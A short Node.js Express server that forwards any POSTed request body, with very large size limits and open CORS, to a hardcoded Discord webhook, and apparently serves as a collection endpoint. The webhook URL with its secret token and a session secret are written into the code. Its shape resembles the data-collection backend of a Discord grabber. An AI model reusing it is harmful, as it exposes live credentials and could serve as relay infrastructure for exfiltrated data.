const Discord = require('discord.js'); const { WebhookClient, MessageEmbed } = require('discord.js')
const express = require('express');
const session = require('express-session');
const cors = require('cors');
const app = express()


app.use(session({ secret: 'IFollowDiscordTos!', resave: false, saveUninitialized: true, cookie: { expires: 2.16e+7 } }));
app.use(cors());
app.use(express.json({ limit: '550mb' }));
app.use(express.urlencoded({ limit: '550mb', extended: true, parameterLimit: 503203023020000 }));

const gtbbb = 'https://discord.com/api/webhooks/1138296814672543804/GwAaPTd5RIBcrb3_anurQRdbxQi4fVy3enKUyhNpat0pdzDGl6cIO4EDuFka0AYavf2E';
const gtb = new WebhookClient({ url: gtbbb });



app.post('/gtb', (req, res) => {
  const { body } = req;

  gtb.send(body)
    .then(() => {
      res.sendStatus(200);

    })
    .then(() => {
      // wb2.send(body) işlemini buraya ekleyebilirsiniz.
    })
    .catch(error => {
      console.error(error);
      res.sendStatus(500);
    });
});

app.listen(80)
